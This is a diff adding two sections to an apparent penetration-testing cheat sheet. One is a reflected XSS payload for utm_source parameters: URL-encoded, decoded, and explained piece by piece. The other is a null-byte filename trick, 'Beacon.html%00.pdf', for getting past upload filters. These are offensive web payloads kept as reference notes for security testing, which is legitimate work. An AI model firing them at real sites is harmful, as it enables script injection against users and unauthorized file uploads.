@@ -13,6 +13,7 @@
    - [SQL Injection](#sqlinj)
    - [Flask Cookies Forge](#flaskcookie)
    - [XSS](#xss)
+   - [Arbitrary File Upload](#AFU)
    - [Symfony](#symfony)
    - [XML External Entity (XXE)](#xxe)
    - [Subdomain Takeover](#subdomain)
@@ -185,6 +186,36 @@ This command would brute force and find out the secret key. Once, a secret key i
 
 <a name = "xss"></a>
 ### XSS
+
+#### url with utm_source
+
+If found a url with utm_source parameter, it is likely that a reflected xss can be done as utm_source cannot escape easily. An example is as per below:-
+
+```
+abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+
+is url encoded for
+
+abc`;return+false});});alert`xss`;</script>
+
+which is used like
+
+abc`;                       Finish the string
+return+false});      Finish the jQuery click function
+});                            Finish the jQuery ready function
+alert`xss`;              Here we can execute our code
+</script>               This closes the script tag to prevent JavaScript parsing errors
+```
+<a name="AFU"></a>
+### Arbitrary File Upload
+
+#### File name to bypass filter
+
+```
+Beacon.html%00.pdf (or other extension which is allowed by the service e.g. .jpg)
+
+```
+
 
 <a name ="symfony"></a>
 ### Symfony
